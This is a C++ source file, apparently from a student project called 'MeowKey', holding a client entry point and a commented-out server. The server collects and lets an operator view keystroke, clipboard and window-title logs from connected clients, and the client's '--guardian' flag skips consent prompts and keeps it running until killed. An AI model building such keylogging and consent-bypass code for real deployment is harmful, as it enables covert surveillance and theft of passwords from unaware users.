#include "client_cross.hpp"
#include <iostream>
#include <string>
#include <cstdlib>
#include <cstring>
using namespace std; 
void printUsage() {
      cout << "Usage: ./client <server_ip> <server_port> <client_id> [--guardian]" <<   endl;
      cout << "Example: ./client 192.168.1.100 8080 bscs24009" <<   endl;
      cout << "         ./client 192.168.1.100 8080 bscs24009 --guardian" <<   endl;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc > 5) {
        printUsage();
        return 1;
    }

      string server_ip = argv[1];
    int port =   stoi(argv[2]);
      string client_id = argv[3];
    
    // Check if launched by guardian (skip consent prompts)
    bool skip_consent = false;
    if (argc == 5 &&   strcmp(argv[4], "--guardian") == 0) {
        skip_consent = true;
    } 

    try {
        Client client(server_ip, port, client_id, skip_consent);
        
        if (!client.start()) {
              cerr << "Failed to start client" <<   endl;
            return 1;
        }
        
        if (!skip_consent) {
              cout << "Client running. Press Enter to stop..." <<   endl;
              cin.get();
            client.stop();
        } else {
            // In guardian mode, run indefinitely until killed
              cout << "Client running under guardian protection..." <<   endl;
            while (true) {
                  this_thread::sleep_for(  chrono::seconds(1));
            }
        }
        
    } catch (const   exception& e) {
          cerr << "Error: " << e.what() <<   endl;
        return 1;
    }

    return 0;
}  



// #include "server_cross.hpp"
// #include "../socket_utils_cross.hpp"
// #include <iostream>
// #include <thread>
// #include <string>

// using namespace std;

// class MeowKeyServer {
// private:
//     int port_;
//     atomic<bool> running_;
//     thread accept_thread_;
//     shared_ptr<ServerControl> control_;

// public:
//     MeowKeyServer(int port)
//         : port_(port), running_(false) {
//         control_ = make_shared<ServerControl>("meowkey.db");
//     }

//     ~MeowKeyServer() {
//         stop();
//     }

//     bool start() {
//         if (running_) return false;

//         running_ = true;
//         accept_thread_ = thread(&MeowKeyServer::acceptLoop, this);

//         cout << "\n╔═══════════════════════════════════════════════════════════╗" << endl;
//         cout << "║        🐱 MEOWKEY SERVER - LIVE MONITORING 🐱             ║" << endl;
//         cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
//         cout << "║ Status: RUNNING                                           ║" << endl;
//         cout << "║ Port: " << port_ << "                                              ║" << endl;
//         cout << "║ Database: meowkey.db (B+ Tree with Hash Table)           ║" << endl;
//         cout << "║ Max Size: 100 MB                                          ║" << endl;
//         cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
//         cout << "║ AVAILABLE COMMANDS:                                       ║" << endl;
//         cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
//         cout << "║ CLIENT MANAGEMENT:                                        ║" << endl;
//         cout << "║   list                    - Show pending & active clients ║" << endl;
//         cout << "║   accept <id>             - Accept pending client        ║" << endl;
//         cout << "║   reject <id>             - Reject pending client        ║" << endl;
//         cout << "║   kick <id>               - Disconnect active client     ║" << endl;
//         cout << "║   clients                 - List all clients in DB       ║" << endl;
//         cout << "║                                                           ║" << endl;
//         cout << "║ DATA MANAGEMENT:                                          ║" << endl;
//         cout << "║   view <id> [type]        - View client data (all/ks/cb/w)║" << endl;
//         cout << "║   range <id> <start> <end>- Query time range (microsec)  ║" << endl;
//         cout << "║   delete <id>             - Delete all data for client   ║" << endl;
//         cout << "║                                                           ║" << endl;
//         cout << "║ SYSTEM:                                                   ║" << endl;
//         cout << "║   stats                   - Database statistics          ║" << endl;
//         cout << "║   help                    - Show this help               ║" << endl;
//         cout << "║   quit/exit               - Shutdown server              ║" << endl;
//         cout << "╚═══════════════════════════════════════════════════════════╝\n" << endl;

//         return true;
//     }

//     void stop() {
//         running_ = false;

//         if (accept_thread_.joinable()) {
//             accept_thread_.join();
//         }

//         control_->stopAllClients();
        
//         #ifdef _WIN32
//             WSACleanup();
//         #endif

//         cout << "\n✅ Server shutdown complete" << endl;
//     }

//     void processCommand(const string& cmd) {
//         if (cmd.empty()) return;

//         istringstream iss(cmd);
//         string command;
//         iss >> command;

//         if (command == "list") {
//             control_->listClients();
//         }
//         else if (command == "accept") {
//             string client_id;
//             if (iss >> client_id) {
//                 control_->acceptClient(client_id);
//             } else {
//                 cout << "Usage: accept <client_id>" << endl;
//             }
//         }
//         else if (command == "reject") {
//             string client_id;
//             if (iss >> client_id) {
//                 control_->rejectClient(client_id);
//             } else {
//                 cout << "Usage: reject <client_id>" << endl;
//             }
//         }
//         else if (command == "kick") {
//             string client_id;
//             if (iss >> client_id) {
//                 control_->kickClient(client_id);
//             } else {
//                 cout << "Usage: kick <client_id>" << endl;
//             }
//         }
//         else if (command == "delete") {
//             string client_id;
//             if (iss >> client_id) {
//                 control_->deleteClientData(client_id);
//             } else {
//                 cout << "Usage: delete <client_id>" << endl;
//             }
//         }
//         else if (command == "view") {
//             string client_id, event_type = "all";
//             if (iss >> client_id) {
//                 iss >> event_type;
//                 if (event_type == "ks") event_type = "keystroke";
//                 if (event_type == "cb") event_type = "clipboard";
//                 if (event_type == "w") event_type = "window";
                
//                 control_->viewClientData(client_id, event_type);
//             } else {
//                 cout << "Usage: view <client_id> [all|keystroke|clipboard|window]" << endl;
//             }
//         }
//         else if (command == "range") {
//             string client_id;
//             uint64_t start_ts, end_ts;
//             if (iss >> client_id >> start_ts >> end_ts) {
//                 control_->viewRangedData(client_id, start_ts, end_ts);
//             } else {
//                 cout << "Usage: range <client_id> <start_timestamp> <end_timestamp>" << endl;
//                 cout << "       Timestamps in microseconds (epoch)" << endl;
//             }
//         }
//         else if (command == "clients") {
//             control_->listAllClients();
//         }
//         else if (command == "stats") {
//             control_->showDatabaseStats();
//         }
//         else if (command == "help") {
//             cout << "\n╔═══════════════════════════════════════════════════════════╗" << endl;
//             cout << "║                   MEOWKEY SERVER HELP                      ║" << endl;
//             cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
//             cout << "║ CLIENT MANAGEMENT:                                        ║" << endl;
//             cout << "║   list                    - Show pending & active clients ║" << endl;
//             cout << "║   accept <id>             - Accept pending client        ║" << endl;
//             cout << "║   reject <id>             - Reject pending client        ║" << endl;
//             cout << "║   kick <id>               - Disconnect active client     ║" << endl;
//             cout << "║   clients                 - List all clients in DB       ║" << endl;
//             cout << "║                                                           ║" << endl;
//             cout << "║ DATA MANAGEMENT:                                          ║" << endl;
//             cout << "║   view <id> [type]        - View client data (all/ks/cb/w)║" << endl;
//             cout << "║   range <id> <start> <end>- Query time range (microsec)  ║" << endl;
//             cout << "║   delete <id>             - Delete all data for client   ║" << endl;
//             cout << "║                                                           ║" << endl;
//             cout << "║ SYSTEM:                                                   ║" << endl;
//             cout << "║   stats                   - Database statistics          ║" << endl;
//             cout << "║   help                    - Show this help               ║" << endl;
//             cout << "║   quit/exit               - Shutdown server              ║" << endl;
//             cout << "╚═══════════════════════════════════════════════════════════╝\n" << endl;
//         }
//         else if (command == "quit" || command == "exit") {
//             cout << "\n⏹️  Shutting down server..." << endl;
//             stop();
//         }
//         else if (!command.empty()) {
//             cout << "❌ Unknown command: '" << command << "'. Type 'help' for commands." << endl;
//         }
//     }

//     void runCommandLoop() {
//         string line;
//         while (running_) {
//             cout << "meowkey> ";
//             if (!getline(cin, line)) break;
            
//             if (!line.empty()) {
//                 processCommand(line);
//             }
//         }
//     }

// private:
//     void acceptLoop() {
//         try {
//             #ifdef _WIN32
//                 WSADATA wsa;
//                 if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
//                     cerr << "WSAStartup failed" << endl;
//                     return;
//                 }
//             #endif

//             int server_socket = SocketUtils::createSocket();
//             if (server_socket < 0) {
//                 cerr << "Failed to create socket" << endl;
//                 return;
//             }

//             SocketUtils::bindSocket(server_socket, port_);
//             SocketUtils::listenSocket(server_socket);

//             cout << "✅ Server listening on port " << port_ << "...\n" << endl;

//             while (running_) {
//                 int client_socket = SocketUtils::acceptConnection(server_socket);
//                 if (client_socket < 0) continue;

//                 string client_id_msg = SocketUtils::receiveData(client_socket);

//                 if (client_id_msg.find("CLIENT_ID:") == 0) {
//                     string client_id = client_id_msg.substr(10);
                    
//                     client_id.erase(0, client_id.find_first_not_of(" \t\n\r"));
//                     client_id.erase(client_id.find_last_not_of(" \t\n\r") + 1);
                    
//                     if (!client_id.empty()) {
//                         control_->acceptNewConnection(client_socket, client_id);
//                     } else {
//                         #ifdef _WIN32
//                             closesocket(client_socket);
//                         #else
//                             close(client_socket);
//                         #endif
//                     }
//                 } else {
//                     cout << "⚠️  Invalid handshake from client" << endl;
//                     #ifdef _WIN32
//                         closesocket(client_socket);
//                     #else
//                         close(client_socket);
//                     #endif
//                 }
//             }

//             #ifdef _WIN32
//                 closesocket(server_socket);
//             #else
//                 close(server_socket);
//             #endif
//         } catch (const exception& e) {
//             cerr << "❌ Accept loop error: " << e.what() << endl;
//         }
//     }
// };

// int main(int argc, char* argv[]) {
//     int port = 8080;

//     if (argc >= 2) {
//         port = atoi(argv[1]);
//     }

//     try {
//         MeowKeyServer server(port);
//         server.start();
//         server.runCommandLoop();
//     } catch (const exception& e) {
//         cerr << "❌ Fatal error: " << e.what() << endl;
//         return 1;
//     }

//     return 0;
// }